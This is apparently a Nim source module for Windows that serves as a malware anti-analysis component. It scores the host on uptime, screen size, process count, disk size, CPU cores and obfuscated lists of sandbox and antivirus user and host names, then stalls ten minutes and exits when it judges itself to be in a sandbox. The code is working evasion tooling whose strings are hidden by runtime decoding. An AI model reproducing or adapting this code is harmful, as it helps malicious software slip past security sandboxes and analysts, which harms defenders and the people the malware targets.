import std/[strutils, os]
import winim/lean
import winim/inc/tlhelp32   # CreateToolhelp32Snapshot, PROCESSENTRY32W
import obfuscation

#################################################################

proc GetSystemMetrics(nIndex: cint): cint
  {.stdcall, dynlib: "user32", importc: "GetSystemMetrics".}

#################################################################
proc GetTickCount(): DWORD
  {.stdcall, dynlib: "kernel32", importc: "GetTickCount".}

#################################################################
proc GetDiskFreeSpaceExW(
  lpDirectoryName:   LPCWSTR,
  lpFreeBytesAvail:  ptr uint64,
  lpTotalBytes:      ptr uint64,
  lpTotalFreeBytes:  ptr uint64): WINBOOL
  {.stdcall, dynlib: "kernel32", importc: "GetDiskFreeSpaceExW".}

#################################################################
const
  SM_CXSCREEN = 0
  SM_CYSCREEN = 1

#################################################################
proc getSandboxUsers(): seq[string] =
  ## Returns known sandbox/AV usernames, decoded at runtime.
  @[
    s("sandbox"), s("malware"), s("virus"), s("test"), s("analyst"),
    s("cuckoo"), s("john"), s("admin"), s("user"), s("wilbert"),
    s("tequilaboomboom"), s("vmware"), s("vbox"), s("qemu"),
    s("currentuser"), s("sample"), s("antivirus"),
  ]

#################################################################
proc getSandboxComps(): seq[string] =
  ## Returns known sandbox/AV hostnames, decoded at runtime.
  @[
    s("sandbox"), s("cuckoo"), s("maltest"), s("virus"), s("malware"),
    s("vmware"), s("vbox"), s("qemu"), s("analysis"), s("lab"),
    s("any.run"), s("hybrid"), s("joe"), s("cape"),
  ]

#################################################################

proc checkUptime(): bool =
  let ms = GetTickCount()
  result = uint32(ms) < 120_000'u32


#################################################################

proc checkScreenResolution(): bool =
  ## Returns true if screen resolution matches common sandbox dimensions.
  let w = GetSystemMetrics(SM_CXSCREEN)
  let h = GetSystemMetrics(SM_CYSCREEN)
  result = (w <= 1024 and h <= 768)


#################################################################
proc checkSandboxNames(): bool =
  ## Returns true if username or hostname matches known sandbox/AV names.
  let user = getEnv(s("USERNAME")).toLowerAscii()
  let comp = getEnv(s("COMPUTERNAME")).toLowerAscii()
  for name in getSandboxUsers():
    if name in user: return true
  for name in getSandboxComps():
    if name in comp: return true
  return false


#################################################################

proc checkProcessCount(): bool =
  ## Returns true if there are suspiciously few processes running.
  var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snap == INVALID_HANDLE_VALUE: return false
  defer: discard CloseHandle(snap)
  var pe: PROCESSENTRY32W
  pe.dwSize = sizeof(PROCESSENTRY32W).DWORD
  var count = 0
  if Process32FirstW(snap, pe.addr) != 0:
    inc count
    while Process32NextW(snap, pe.addr) != 0:
      inc count
  result = count < 15


#################################################################

proc checkDiskSize(): bool =
  ## Returns true if the system disk is smaller than 60 GB.
  var total: uint64 = 0
  var free:  uint64 = 0
  var avail: uint64 = 0
  var wPath = newWideCString(s("C:\\"))
  discard GetDiskFreeSpaceExW(wPath, avail.addr, total.addr, free.addr)
  result = total > 0 and total < (60'u64 * 1024'u64 * 1024'u64 * 1024'u64)


#################################################################

proc checkCpuCores(): bool =
  ## Returns true if the machine has only 1 CPU core.
  var si: SYSTEM_INFO
  GetSystemInfo(si.addr)
  result = si.dwNumberOfProcessors <= 1

#################################################################
#################################################################

proc isSandbox*(): bool =
  var score = 0
  if checkUptime():           inc score
  if checkScreenResolution(): inc score
  if checkSandboxNames():     inc score
  if checkProcessCount():     inc score
  if checkDiskSize():         inc score
  if checkCpuCores():         inc score
  result = score >= 5

#################################################################

proc sandboxExit*() =
  if isSandbox():
    sleep(600_000)   # 10 minutes — most sandboxes time out after 2-5 minutes
    quit(0)

#################################################################